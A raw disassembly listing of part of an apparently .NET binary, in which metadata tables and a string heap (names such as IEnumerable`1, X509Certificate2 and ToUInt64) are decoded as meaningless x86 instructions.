  406f62:	7d 07                	jge    0x406f6b
  406f64:	89 00                	mov    %eax,(%eax)
  406f66:	99                   	cltd
  406f67:	17                   	pop    %ss
  406f68:	8d 07                	lea    (%edi),%eax
  406f6a:	89 00                	mov    %eax,(%eax)
  406f6c:	e5 01                	in     $0x1,%eax
  406f6e:	93                   	xchg   %eax,%ebx
  406f6f:	07                   	pop    %es
  406f70:	91                   	xchg   %eax,%ecx
  406f71:	00 68 03             	add    %ch,0x3(%eax)
  406f74:	93                   	xchg   %eax,%ebx
  406f75:	07                   	pop    %es
  406f76:	e1 03                	loope  0x406f7b
  406f78:	0f 1d 99 07 99 00 a8 	nopl   -0x57ff66f9(%ecx)
  406f7f:	14 a3                	adc    $0xa3,%al
  406f81:	07                   	pop    %es
  406f82:	e9 03 29 08 0e       	jmp    0xe48988a
  406f87:	00 f1                	add    %dh,%cl
  406f89:	03 a8 14 49 04 f9    	add    -0x6fbb6ec(%eax),%ebp
  406f8f:	03 79 0b             	add    0xb(%ecx),%edi
  406f92:	ab                   	stos   %eax,%es:(%edi)
  406f93:	07                   	pop    %es
  406f94:	81 00 f1 04 0a 00    	addl   $0xa04f1,(%eax)
  406f9a:	09 03                	or     %eax,(%ebx)
  406f9c:	45                   	inc    %ebp
  406f9d:	1c 87                	sbb    $0x87,%al
  406f9f:	06                   	push   %es
  406fa0:	09 03                	or     %eax,(%ebx)
  406fa2:	83 0a b9             	orl    $0xffffffb9,(%edx)
  406fa5:	07                   	pop    %es
  406fa6:	91                   	xchg   %eax,%ecx
  406fa7:	01 53 05             	add    %edx,0x5(%ebx)
  406faa:	95                   	xchg   %eax,%ebp
  406fab:	01 09                	add    %ecx,(%ecx)
  406fad:	03 45 1c             	add    0x1c(%ebp),%eax
  406fb0:	c9                   	leave
  406fb1:	07                   	pop    %es
  406fb2:	09 03                	or     %eax,(%ebx)
  406fb4:	7a 0a                	jp     0x406fc0
  406fb6:	ce                   	into
  406fb7:	06                   	push   %es
  406fb8:	09 03                	or     %eax,(%ebx)
  406fba:	63 0a                	arpl   %ecx,(%edx)
  406fbc:	53                   	push   %ebx
  406fbd:	01 09                	add    %ecx,(%ecx)
  406fbf:	03 5f 1c             	add    0x1c(%edi),%ebx
  406fc2:	d0 07                	rolb   $1,(%edi)
  406fc4:	09 03                	or     %eax,(%ebx)
  406fc6:	42                   	inc    %edx
  406fc7:	05 53 01 99 03       	add    $0x3990153,%eax
  406fcc:	75 1b                	jne    0x406fe9
  406fce:	eb 07                	jmp    0x406fd7
  406fd0:	0c 00                	or     $0x0,%al
  406fd2:	ae                   	scas   %es:(%edi),%al
  406fd3:	0a 01                	or     (%ecx),%al
  406fd5:	08 09                	or     %cl,(%ecx)
  406fd7:	04 50                	add    $0x50,%al
  406fd9:	10 0b                	adc    %cl,(%ebx)
  406fdb:	08 09                	or     %cl,(%ecx)
  406fdd:	04 15                	add    $0x15,%al
  406fdf:	03 11                	add    (%ecx),%edx
  406fe1:	08 11                	or     %dl,(%ecx)
  406fe3:	04 f0                	add    $0xf0,%al
  406fe5:	07                   	pop    %es
  406fe6:	19 08                	sbb    %ecx,(%eax)
  406fe8:	21 04 c4             	and    %eax,(%esp,%eax,8)
  406feb:	04 20                	add    $0x20,%al
  406fed:	08 19                	or     %bl,(%ecx)
  406fef:	04 e2                	add    $0xe2,%al
  406ff1:	05 27 08 31 04       	add    $0x4310827,%eax
  406ff6:	7e 08                	jle    0x407000
  406ff8:	30 08                	xor    %cl,(%eax)
  406ffa:	41                   	inc    %ecx
  406ffb:	04 6d                	add    $0x6d,%al
  406ffd:	12 3a                	adc    (%edx),%bh
  406fff:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407002:	7e 08                	jle    0x40700c
  407004:	6f                   	outsl  %ds:(%esi),(%dx)
  407005:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407008:	2b 19                	sub    (%ecx),%ebx
  40700a:	7b 08                	jnp    0x407014
  40700c:	34 00                	xor    $0x0,%al
  40700e:	6f                   	outsl  %ds:(%esi),(%dx)
  40700f:	05 93 08 c9 01       	add    $0x1c90893,%eax
  407014:	4d                   	dec    %ebp
  407015:	1d 84 00 61 04       	sbb    $0x4610084,%eax
  40701a:	a8 14                	test   $0x14,%al
  40701c:	53                   	push   %ebx
  40701d:	01 59 04             	add    %ebx,0x4(%ecx)
  407020:	a8 14                	test   $0x14,%al
  407022:	b1 08                	mov    $0x8,%cl
  407024:	69 04 56 16 b9 08 51 	imul   $0x5108b916,(%esi,%edx,2),%eax
  40702b:	01 f5                	add    %esi,%ebp
  40702d:	0b cd                	or     %ebp,%ecx
  40702f:	00 89 04 a8 14 53    	add    %cl,0x5314a804(%ecx)
  407035:	01 71 04             	add    %esi,0x4(%ecx)
  407038:	a8 14                	test   $0x14,%al
  40703a:	0e                   	push   %cs
  40703b:	00 91 04 21 0b fa    	add    %dl,-0x5f4defc(%ecx)
  407041:	02 91 04 be 0a fa    	add    -0x5f541fc(%ecx),%dl
  407047:	02 91 04 d3 04 d2    	add    -0x2dfb2cfc(%ecx),%dl
  40704d:	08 91 04 6d 0b d9    	or     %dl,-0x26f492fc(%ecx)
  407053:	08 91 04 3d 1c 79    	or     %dl,0x791c3d04(%ecx)
  407059:	01 91 04 7d 02 0e    	add    %edx,0xe027d04(%ecx)
  40705f:	00 91 04 cd 14 e0    	add    %dl,-0x1feb32fc(%ecx)
  407065:	08 79 04             	or     %bh,0x4(%ecx)
  407068:	a8 14                	test   $0x14,%al
  40706a:	e6 08                	out    %al,$0x8
  40706c:	91                   	xchg   %eax,%ecx
  40706d:	04 6f                	add    $0x6f,%al
  40706f:	02 7f 01             	add    0x1(%edi),%bh
  407072:	79 04                	jns    0x407078
  407074:	eb 0d                	jmp    0x407083
  407076:	0e                   	push   %cs
  407077:	00 81 04 a8 14 79    	add    %al,0x7914a804(%ecx)
  40707d:	01 59 02             	add    %ebx,0x2(%ecx)
  407080:	16                   	push   %ss
  407081:	1c 7f                	sbb    $0x7f,%al
  407083:	01 b9 03 c0 0c f2    	add    %edi,-0xdf33ffd(%ecx)
  407089:	08 b9 04 a8 14 53    	or     %bh,0x5314a804(%ecx)
  40708f:	01 91 04 76 02 79    	add    %edx,0x79027604(%ecx)
  407095:	01 91 04 bd 14 e0    	add    %edx,-0x1feb42fc(%ecx)
  40709b:	08 c1                	or     %al,%cl
  40709d:	04 d0                	add    $0xd0,%al
  40709f:	1c 16                	sbb    $0x16,%al
  4070a1:	09 c9                	or     %ecx,%ecx
  4070a3:	04 a8                	add    $0xa8,%al
  4070a5:	14 0e                	adc    $0xe,%al
  4070a7:	00 d1                	add    %dl,%cl
  4070a9:	04 a8                	add    $0xa8,%al
  4070ab:	14 4f                	adc    $0x4f,%al
  4070ad:	09 08                	or     %ecx,(%eax)
  4070af:	00 a4 00 cd 01 08 00 	add    %ah,0x801cd(%eax,%eax,1)
  4070b6:	a8 00                	test   $0x0,%al
  4070b8:	d2 01                	rolb   %cl,(%ecx)
  4070ba:	08 00                	or     %al,(%eax)
  4070bc:	ac                   	lods   %ds:(%esi),%al
  4070bd:	00 d7                	add    %dl,%bh
  4070bf:	01 08                	add    %ecx,(%eax)
  4070c1:	00 b0 00 dc 01 08    	add    %dh,0x801dc00(%eax)
  4070c7:	00 b4 00 e1 01 08 00 	add    %dh,0x801e1(%eax,%eax,1)
  4070ce:	b8 00 e6 01 08       	mov    $0x801e600,%eax
  4070d3:	00 bc 00 eb 01 08 00 	add    %bh,0x801eb(%eax,%eax,1)
  4070da:	c0 00 f0             	rolb   $0xf0,(%eax)
  4070dd:	01 08                	add    %ecx,(%eax)
  4070df:	00 c4                	add    %al,%ah
  4070e1:	00 f5                	add    %dh,%ch
  4070e3:	01 08                	add    %ecx,(%eax)
  4070e5:	00 c8                	add    %cl,%al
  4070e7:	00 fa                	add    %bh,%dl
  4070e9:	01 08                	add    %ecx,(%eax)
  4070eb:	00 cc                	add    %cl,%ah
  4070ed:	00 ff                	add    %bh,%bh
  4070ef:	01 08                	add    %ecx,(%eax)
  4070f1:	00 d0                	add    %dl,%al
  4070f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4070f6:	09 00                	or     %eax,(%eax)
  4070f8:	d8 00                	fadds  (%eax)
  4070fa:	8e 02                	mov    (%edx),%es
  4070fc:	09 00                	or     %eax,(%eax)
  4070fe:	dc 00                	faddl  (%eax)
  407100:	d7                   	xlat   %ds:(%ebx)
  407101:	01 09                	add    %ecx,(%ecx)
  407103:	00 e0                	add    %ah,%al
  407105:	00 d2                	add    %dl,%dl
  407107:	01 08                	add    %ecx,(%eax)
  407109:	00 f4                	add    %dh,%ah
  40710b:	00 cf                	add    %cl,%bh
  40710d:	02 08                	add    (%eax),%cl
  40710f:	00 f8                	add    %bh,%al
  407111:	00 d4                	add    %dl,%ah
  407113:	02 08                	add    (%eax),%cl
  407115:	00 fc                	add    %bh,%ah
  407117:	00 d9                	add    %bl,%cl
  407119:	02 08                	add    (%eax),%cl
  40711b:	00 00                	add    %al,(%eax)
  40711d:	01 cf                	add    %ecx,%edi
  40711f:	02 2e                	add    (%esi),%ch
  407121:	00 2b                	add    %ch,(%ebx)
  407123:	00 ff                	add    %bh,%bh
  407125:	02 2e                	add    (%esi),%ch
  407127:	00 33                	add    %dh,(%ebx)
  407129:	00 08                	add    %cl,(%eax)
  40712b:	03 2e                	add    (%esi),%ebp
  40712d:	00 3b                	add    %bh,(%ebx)
  40712f:	00 2d 03 2e 00 43    	add    %ch,0x43002e03
  407135:	00 36                	add    %dh,(%esi)
  407137:	03 2e                	add    (%esi),%ebp
  407139:	00 4b 00             	add    %cl,0x0(%ebx)
  40713c:	36 03 2e             	add    %ss:(%esi),%ebp
  40713f:	00 53 00             	add    %dl,0x0(%ebx)
  407142:	36 03 2e             	add    %ss:(%esi),%ebp
  407145:	00 5b 00             	add    %bl,0x0(%ebx)
  407148:	36 03 2e             	add    %ss:(%esi),%ebp
  40714b:	00 63 00             	add    %ah,0x0(%ebx)
  40714e:	36 03 2e             	add    %ss:(%esi),%ebp
  407151:	00 6b 00             	add    %ch,0x0(%ebx)
  407154:	36 03 2e             	add    %ss:(%esi),%ebp
  407157:	00 73 00             	add    %dh,0x0(%ebx)
  40715a:	36 03 2e             	add    %ss:(%esi),%ebp
  40715d:	00 7b 00             	add    %bh,0x0(%ebx)
  407160:	36 03 2e             	add    %ss:(%esi),%ebp
  407163:	00 83 00 3c 03 2e    	add    %al,0x2e033c00(%ebx)
  407169:	00 8b 00 49 03 c0    	add    %cl,-0x3ffcb700(%ebx)
  40716f:	00 93 00 d2 01 e0    	add    %dl,-0x1ffe2e00(%ebx)
  407175:	00 93 00 d2 01 e3    	add    %dl,-0x1cfe2e00(%ebx)
  40717b:	00 9b 00 af 03 00    	add    %bl,0x3af00(%ebx)
  407181:	01 93 00 d2 01 20    	add    %edx,0x2001d200(%ebx)
  407187:	01 93 00 d2 01 40    	add    %edx,0x4001d200(%ebx)
  40718d:	01 93 00 d2 01 60    	add    %edx,0x6001d200(%ebx)
  407193:	01 93 00 d2 01 80    	add    %edx,-0x7ffe2e00(%ebx)
  407199:	01 93 00 d2 01 a0    	add    %edx,-0x5ffe2e00(%ebx)
  40719f:	01 93 00 d2 01 c0    	add    %edx,-0x3ffe2e00(%ebx)
  4071a5:	01 93 00 d2 01 e0    	add    %edx,-0x1ffe2e00(%ebx)
  4071ab:	01 93 00 d2 01 00    	add    %edx,0x1d200(%ebx)
  4071b1:	02 93 00 d2 01 20    	add    0x2001d200(%ebx),%dl
  4071b7:	02 93 00 d2 01 40    	add    0x4001d200(%ebx),%dl
  4071bd:	02 93 00 d2 01 41    	add    0x4101d200(%ebx),%dl
  4071c3:	02 93 00 d2 01 60    	add    0x6001d200(%ebx),%dl
  4071c9:	02 93 00 d2 01 61    	add    0x6101d200(%ebx),%dl
  4071cf:	02 93 00 d2 01 80    	add    -0x7ffe2e00(%ebx),%dl
  4071d5:	02 93 00 d2 01 81    	add    -0x7efe2e00(%ebx),%dl
  4071db:	02 93 00 d2 01 a0    	add    -0x5ffe2e00(%ebx),%dl
  4071e1:	02 93 00 d2 01 a1    	add    -0x5efe2e00(%ebx),%dl
  4071e7:	02 93 00 d2 01 c0    	add    -0x3ffe2e00(%ebx),%dl
  4071ed:	02 93 00 d2 01 c1    	add    -0x3efe2e00(%ebx),%dl
  4071f3:	02 93 00 d2 01 e0    	add    -0x1ffe2e00(%ebx),%dl
  4071f9:	02 93 00 d2 01 e1    	add    -0x1efe2e00(%ebx),%dl
  4071ff:	02 93 00 d2 01 e3    	add    -0x1cfe2e00(%ebx),%dl
  407205:	02 93 00 d2 01 00    	add    0x1d200(%ebx),%dl
  40720b:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  407211:	03 93 00 d2 01 21    	add    0x2101d200(%ebx),%edx
  407217:	03 93 00 d2 01 41    	add    0x4101d200(%ebx),%edx
  40721d:	03 93 00 d2 01 61    	add    0x6101d200(%ebx),%edx
  407223:	03 93 00 d2 01 63    	add    0x6301d200(%ebx),%edx
  407229:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  40722f:	00 06                	add    %al,(%esi)
  407231:	00 00                	add    %al,(%eax)
  407233:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407236:	01 00                	add    %eax,(%eax)
  407238:	20 00                	and    %al,(%eax)
  40723a:	00 00                	add    %al,(%eax)
  40723c:	1d 00 b9 03 c8       	sbb    $0xc803b900,%eax
  407241:	03 f3                	add    %ebx,%esi
  407243:	03 8f 04 b5 04 df    	add    -0x20fb4afc(%edi),%ecx
  407249:	04 f6                	add    $0xf6,%al
  40724b:	04 0a                	add    $0xa,%al
  40724d:	05 15 05 3b 05       	add    $0x53b0515,%eax
  407252:	48                   	dec    %eax
  407253:	05 8d 05 9e 05       	add    $0x59e058d,%eax
  407258:	bc 05 d2 05 d8       	mov    $0xd805d205,%esp
  40725d:	05 0f 06 19 06       	add    $0x619060f,%eax
  407262:	1f                   	pop    %ds
  407263:	06                   	push   %es
  407264:	24 06                	and    $0x6,%al
  407266:	2a 06                	sub    (%esi),%al
  407268:	33 06                	xor    (%esi),%eax
  40726a:	40                   	inc    %eax
  40726b:	06                   	push   %es
  40726c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40726d:	06                   	push   %es
  40726e:	ab                   	stos   %eax,%es:(%edi)
  40726f:	06                   	push   %es
  407270:	d3 06                	roll   %cl,(%esi)
  407272:	dc 06                	faddl  (%esi)
  407274:	e1 06                	loope  0x40727c
  407276:	eb 06                	jmp    0x40727e
  407278:	16                   	push   %ss
  407279:	07                   	pop    %es
  40727a:	26 07                	es pop %es
  40727c:	38 07                	cmp    %al,(%edi)
  40727e:	5f                   	pop    %edi
  40727f:	07                   	pop    %es
  407280:	84 07                	test   %al,(%edi)
  407282:	b2 07                	mov    $0x7,%dl
  407284:	c2 07 d8             	ret    $0xd807
  407287:	07                   	pop    %es
  407288:	07                   	pop    %es
  407289:	08 ab 08 bf 08 fb    	or     %ch,-0x4f740f8(%ebx)
  40728f:	08 23                	or     %ah,(%ebx)
  407291:	09 28                	or     %ebp,(%eax)
  407293:	09 37                	or     %esi,(%edi)
  407295:	09 3f                	or     %edi,(%edi)
  407297:	09 58 09             	or     %ebx,0x9(%eax)
  40729a:	04 00                	add    $0x0,%al
  40729c:	01 00                	add    %eax,(%eax)
  40729e:	06                   	push   %es
  40729f:	00 0b                	add    %cl,(%ebx)
  4072a1:	00 07                	add    %al,(%edi)
  4072a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4072a6:	08 00                	or     %al,(%eax)
  4072a8:	0e                   	push   %cs
  4072a9:	00 00                	add    %al,(%eax)
  4072ab:	00 2c 1a             	add    %ch,(%edx,%ebx,1)
  4072ae:	9f                   	lahf
  4072af:	00 00                	add    %al,(%eax)
  4072b1:	00 10                	add    %dl,(%eax)
  4072b3:	1a a4 00 00 00 39 13 	sbb    0x13390000(%eax,%eax,1),%ah
  4072ba:	a9 00 00 00 ed       	test   $0xed000000,%eax
  4072bf:	0a ae 00 00 00 98    	or     -0x68000000(%esi),%ch
  4072c5:	19 ae 00 00 00 a4    	sbb    %ebp,-0x5c000000(%esi)
  4072cb:	0a b2 00 00 00 53    	or     0x53000000(%edx),%dh
  4072d1:	03 b7 00 00 00 ec    	add    -0x14000000(%edi),%esi
  4072d7:	02 bb 00 00 00 57    	add    0x57000000(%ebx),%bh
  4072dd:	0b b2 00 00 00 9c    	or     -0x64000000(%edx),%esi
  4072e3:	0e                   	push   %cs
  4072e4:	bf 00 00 00 70       	mov    $0x70000000,%edi
  4072e9:	1a 0c 01             	sbb    (%ecx,%eax,1),%cl
  4072ec:	00 00                	add    %al,(%eax)
  4072ee:	69 0f 41 01 00 00    	imul   $0x141,(%edi),%ecx
  4072f4:	3f                   	aas
  4072f5:	0d 47 01 00 00       	or     $0x147,%eax
  4072fa:	6a 0c                	push   $0xc
  4072fc:	b7 01                	mov    $0x1,%bh
  4072fe:	00 00                	add    %al,(%eax)
  407300:	79 13                	jns    0x407315
  407302:	bb 01 00 00 c6       	mov    $0xc6000001,%ebx
  407307:	18 bf 01 00 00 2d    	sbb    %bh,0x2d000001(%edi)
  40730d:	1c c3                	sbb    $0xc3,%al
  40730f:	01 00                	add    %eax,(%eax)
  407311:	00 c3                	add    %al,%bl
  407313:	07                   	pop    %es
  407314:	c8 01 02 00          	enter  $0x201,$0x0
  407318:	06                   	push   %es
  407319:	00 03                	add    %al,(%ebx)
  40731b:	00 01                	add    %al,(%ecx)
  40731d:	00 07                	add    %al,(%edi)
  40731f:	00 03                	add    %al,(%ebx)
  407321:	00 02                	add    %al,(%edx)
  407323:	00 08                	add    %cl,(%eax)
  407325:	00 05 00 01 00 09    	add    %al,0x9000100
  40732b:	00 05 00 02 00 0a    	add    %al,0xa000200
  407331:	00 07                	add    %al,(%edi)
  407333:	00 01                	add    %al,(%ecx)
  407335:	00 0b                	add    %cl,(%ebx)
  407337:	00 07                	add    %al,(%edi)
  407339:	00 02                	add    %al,(%edx)
  40733b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40733e:	09 00                	or     %eax,(%eax)
  407340:	01 00                	add    %eax,(%eax)
  407342:	0d 00 09 00 02       	or     $0x2000900,%eax
  407347:	00 0e                	add    %cl,(%esi)
  407349:	00 0b                	add    %cl,(%ebx)
  40734b:	00 01                	add    %al,(%ecx)
  40734d:	00 0f                	add    %cl,(%edi)
  40734f:	00 0b                	add    %cl,(%ebx)
  407351:	00 02                	add    %al,(%edx)
  407353:	00 10                	add    %dl,(%eax)
  407355:	00 0d 00 01 00 11    	add    %cl,0x11000100
  40735b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407361:	00 0f                	add    %cl,(%edi)
  407363:	00 01                	add    %al,(%ecx)
  407365:	00 13                	add    %dl,(%ebx)
  407367:	00 0f                	add    %cl,(%edi)
  407369:	00 02                	add    %al,(%edx)
  40736b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40736e:	11 00                	adc    %eax,(%eax)
  407370:	02 00                	add    (%eax),%al
  407372:	15 00 13 00 01       	adc    $0x1001300,%eax
  407377:	00 16                	add    %dl,(%esi)
  407379:	00 13                	add    %dl,(%ebx)
  40737b:	00 02                	add    %al,(%edx)
  40737d:	00 17                	add    %dl,(%edi)
  40737f:	00 15 00 01 00 18    	add    %dl,0x18000100
  407385:	00 15 00 02 00 2e    	add    %dl,0x2e000200
  40738b:	00 17                	add    %dl,(%edi)
  40738d:	00 02                	add    %al,(%edx)
  40738f:	00 36                	add    %dh,(%esi)
  407391:	00 19                	add    %bl,(%ecx)
  407393:	00 02                	add    %al,(%edx)
  407395:	00 37                	add    %dh,(%edi)
  407397:	00 1b                	add    %bl,(%ebx)
  407399:	00 02                	add    %al,(%edx)
  40739b:	00 59 00             	add    %bl,0x0(%ecx)
  40739e:	1d 00 01 00 5a       	sbb    $0x5a000100,%eax
  4073a3:	00 1d 00 02 00 5b    	add    %bl,0x5b000200
  4073a9:	00 1f                	add    %bl,(%edi)
  4073ab:	00 01                	add    %al,(%ecx)
  4073ad:	00 5c 00 1f          	add    %bl,0x1f(%eax,%eax,1)
  4073b1:	00 02                	add    %al,(%edx)
  4073b3:	00 5d 00             	add    %bl,0x0(%ebp)
  4073b6:	21 00                	and    %eax,(%eax)
  4073b8:	01 00                	add    %eax,(%eax)
  4073ba:	5e                   	pop    %esi
  4073bb:	00 21                	add    %ah,(%ecx)
  4073bd:	00 02                	add    %al,(%edx)
  4073bf:	00 5f 00             	add    %bl,0x0(%edi)
  4073c2:	23 00                	and    (%eax),%eax
  4073c4:	02 00                	add    (%eax),%al
  4073c6:	60                   	pusha
  4073c7:	00 25 00 06 00 5c    	add    %ah,0x5c000600
  4073cd:	00 03                	add    %al,(%ebx)
  4073cf:	00 06                	add    %al,(%esi)
  4073d1:	00 5e 00             	add    %bl,0x0(%esi)
  4073d4:	05 00 06 00 60       	add    $0x60000600,%eax
  4073d9:	00 07                	add    %al,(%edi)
  4073db:	00 08                	add    %cl,(%eax)
  4073dd:	00 c2                	add    %al,%dl
  4073df:	00 09                	add    %cl,(%ecx)
  4073e1:	00 b4 0e c1 0e fd 04 	add    %dh,0x4fd0ec1(%esi,%ecx,1)
  4073e8:	2e 05 9b 05 71 07    	cs add $0x771059b,%eax
  4073ee:	57                   	push   %edi
  4073ef:	08 7f 08             	or     %bh,0x8(%edi)
  4073f2:	00 01                	add    %al,(%ecx)
  4073f4:	f1                   	int1
  4073f5:	00 c0                	add    %al,%al
  4073f7:	05 01 00 41 01       	add    $0x1410001,%eax
  4073fc:	f3 00 cd             	repz add %cl,%ch
  4073ff:	1a 01                	sbb    (%ecx),%al
  407401:	00 40 01             	add    %al,0x1(%eax)
  407404:	0b 01                	or     (%ecx),%eax
  407406:	85 08                	test   %ecx,(%eax)
  407408:	01 00                	add    %eax,(%eax)
  40740a:	40                   	inc    %eax
  40740b:	01 19                	add    %ebx,(%ecx)
  40740d:	01 1d 0e 02 00 50    	add    %ebx,0x5000020e
  407413:	20 00                	and    %al,(%eax)
  407415:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  407419:	20 00                	and    %al,(%eax)
  40741b:	00 45 00             	add    %al,0x0(%ebp)
  40741e:	04 80                	add    $0x80,%al
  407420:	00 00                	add    %al,(%eax)
  407422:	01 00                	add    %eax,(%eax)
	...
  407430:	b2 02                	mov    $0x2,%dl
  407432:	00 00                	add    %al,(%eax)
  407434:	04 00                	add    $0x0,%al
	...
  40743e:	00 00                	add    %al,(%eax)
  407440:	01 00                	add    %eax,(%eax)
  407442:	a9 02 00 00 00       	test   $0x2,%eax
  407447:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407452:	00 00                	add    %al,(%eax)
  407454:	01 00                	add    %eax,(%eax)
  407456:	82 0f 00             	orb    $0x0,(%edi)
  407459:	00 00                	add    %al,(%eax)
  40745b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407466:	00 00                	add    %al,(%eax)
  407468:	70 02                	jo     0x40746c
  40746a:	98                   	cwtl
  40746b:	0c 00                	or     $0x0,%al
  40746d:	00 00                	add    %al,(%eax)
  40746f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40747a:	00 00                	add    %al,(%eax)
  40747c:	01 00                	add    %eax,(%eax)
  40747e:	0d 08 00 00 00       	or     $0x8,%eax
  407483:	00 0a                	add    %cl,(%edx)
	...
  40748d:	00 00                	add    %al,(%eax)
  40748f:	00 70 02             	add    %dh,0x2(%eax)
  407492:	d2 02                	rolb   %cl,(%edx)
  407494:	00 00                	add    %al,(%eax)
  407496:	00 00                	add    %al,(%eax)
  407498:	04 00                	add    $0x0,%al
	...
  4074a2:	00 00                	add    %al,(%eax)
  4074a4:	70 02                	jo     0x4074a8
  4074a6:	4b                   	dec    %ebx
  4074a7:	1a 00                	sbb    (%eax),%al
  4074a9:	00 00                	add    %al,(%eax)
  4074ab:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4074b6:	00 00                	add    %al,(%eax)
  4074b8:	01 00                	add    %eax,(%eax)
  4074ba:	51                   	push   %ecx
  4074bb:	17                   	pop    %ss
  4074bc:	00 00                	add    %al,(%eax)
  4074be:	00 00                	add    %al,(%eax)
  4074c0:	04 00                	add    $0x0,%al
	...
  4074ca:	00 00                	add    %al,(%eax)
  4074cc:	70 02                	jo     0x4074d0
  4074ce:	37                   	aaa
  4074cf:	12 00                	adc    (%eax),%al
  4074d1:	00 00                	add    %al,(%eax)
  4074d3:	00 12                	add    %dl,(%edx)
  4074d5:	00 11                	add    %dl,(%ecx)
  4074d7:	00 17                	add    %dl,(%edi)
  4074d9:	00 16                	add    %dl,(%esi)
  4074db:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4074de:	1b 00                	sbb    (%eax),%eax
  4074e0:	1d 00 1b 00 79       	sbb    $0x79001b00,%eax
  4074e5:	01 03                	add    %eax,(%ebx)
  4074e7:	07                   	pop    %es
  4074e8:	7b 01                	jnp    0x4074eb
  4074ea:	03 07                	add    (%edi),%eax
  4074ec:	d7                   	xlat   %ds:(%ebx)
  4074ed:	01 fc                	add    %edi,%esp
  4074ef:	07                   	pop    %es
  4074f0:	00 41 63             	add    %al,0x63(%ecx)
  4074f3:	74 69                	je     0x40755e
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	60                   	pusha
  4074f8:	31 30                	xor    %esi,(%eax)
  4074fa:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4074fd:	70 5f                	jo     0x40755e
  4074ff:	5f                   	pop    %edi
  407500:	30 00                	xor    %al,(%eax)
  407502:	49                   	dec    %ecx
  407503:	45                   	inc    %ebp
  407504:	6e                   	outsb  %ds:(%esi),(%dx)
  407505:	75 6d                	jne    0x407574
  407507:	65 72 61             	gs jb  0x40756b
  40750a:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40750e:	31 00                	xor    %eax,(%eax)
  407510:	43                   	inc    %ebx
  407511:	61                   	popa
  407512:	6c                   	insb   (%dx),%es:(%edi)
  407513:	6c                   	insb   (%dx),%es:(%edi)
  407514:	53                   	push   %ebx
  407515:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  40751c:	69 
  40751d:	73 74                	jae    0x407593
  40751f:	60                   	pusha
  407520:	31 00                	xor    %eax,(%eax)
  407522:	61                   	popa
  407523:	31 00                	xor    %eax,(%eax)
  407525:	76 31                	jbe    0x407558
  407527:	00 5f 5f             	add    %bl,0x5f(%edi)
  40752a:	53                   	push   %ebx
  40752b:	74 61                	je     0x40758e
  40752d:	74 69                	je     0x407598
  40752f:	63 41 72             	arpl   %eax,0x72(%ecx)
  407532:	72 61                	jb     0x407595
  407534:	79 49                	jns    0x40757f
  407536:	6e                   	outsb  %ds:(%esi),(%dx)
  407537:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40753e:	69 
  40753f:	7a 65                	jp     0x4075a6
  407541:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407546:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40754d:	74 2e                	je     0x40757d
  40754f:	57                   	push   %edi
  407550:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407557:	55                   	push   %ebp
  407558:	49                   	dec    %ecx
  407559:	6e                   	outsb  %ds:(%esi),(%dx)
  40755a:	74 33                	je     0x40758f
  40755c:	32 00                	xor    (%eax),%al
  40755e:	54                   	push   %esp
  40755f:	6f                   	outsl  %ds:(%esi),(%dx)
  407560:	49                   	dec    %ecx
  407561:	6e                   	outsb  %ds:(%esi),(%dx)
  407562:	74 33                	je     0x407597
  407564:	32 00                	xor    (%eax),%al
  407566:	53                   	push   %ebx
  407567:	77 61                	ja     0x4075ca
  407569:	70 49                	jo     0x4075b4
  40756b:	6e                   	outsb  %ds:(%esi),(%dx)
  40756c:	74 33                	je     0x4075a1
  40756e:	32 00                	xor    (%eax),%al
  407570:	3c 3e                	cmp    $0x3e,%al
  407572:	6f                   	outsl  %ds:(%esi),(%dx)
  407573:	5f                   	pop    %edi
  407574:	5f                   	pop    %edi
  407575:	32 00                	xor    (%eax),%al
  407577:	61                   	popa
  407578:	32 00                	xor    (%eax),%al
  40757a:	58                   	pop    %eax
  40757b:	35 30 39 43 65       	xor    $0x65433930,%eax
  407580:	72 74                	jb     0x4075f6
  407582:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  407589:	32 00                	xor    (%eax),%al
  40758b:	76 32                	jbe    0x4075bf
  40758d:	00 76 33             	add    %dh,0x33(%esi)
  407590:	00 57 72             	add    %dl,0x72(%edi)
  407593:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  40759a:	36 
  40759b:	34 00                	xor    $0x0,%al
  40759d:	54                   	push   %esp
  40759e:	6f                   	outsl  %ds:(%esi),(%dx)
  40759f:	55                   	push   %ebp
  4075a0:	49                   	dec    %ecx
  4075a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4075a2:	74 36                	je     0x4075da
  4075a4:	34 00                	xor    $0x0,%al
  4075a6:	47                   	inc    %edi
  4075a7:	65 74 41             	gs je  0x4075eb
  4075aa:	73 55                	jae    0x407601
  4075ac:	49                   	dec    %ecx
  4075ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4075ae:	74 36                	je     0x4075e6
  4075b0:	34 00                	xor    $0x0,%al
  4075b2:	53                   	push   %ebx
  4075b3:	65 74 41             	gs je  0x4075f7
  4075b6:	73 55                	jae    0x40760d
